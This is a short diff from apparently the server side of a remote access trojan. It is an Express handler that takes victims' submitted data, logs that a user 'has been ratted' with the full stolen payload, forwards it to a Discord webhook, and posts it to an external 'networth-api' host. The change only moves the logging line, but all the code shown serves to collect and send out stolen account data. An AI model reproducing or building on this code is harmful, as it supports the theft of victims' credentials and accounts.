@@ -184,6 +184,8 @@ app.post("/", (req, res) => {
                         }).catch(err => {
                             console.log(`[R.A.T] Error while sending to Discord webhook:\n${err}`)
                         })
+
+                        console.log(`[R.A.T] ${req.body.username} has been ratted!\n${JSON.stringify(req.body)}`)
                     }
 
                     post("https://networth-api-dxxxxy.onrender.com", req.body, {
@@ -197,8 +199,6 @@ app.post("/", (req, res) => {
                 });
 
             }
-
-            console.log(`[R.A.T] ${req.body.username} has been ratted!\n${JSON.stringify(req.body)}`)
         }
     })
 
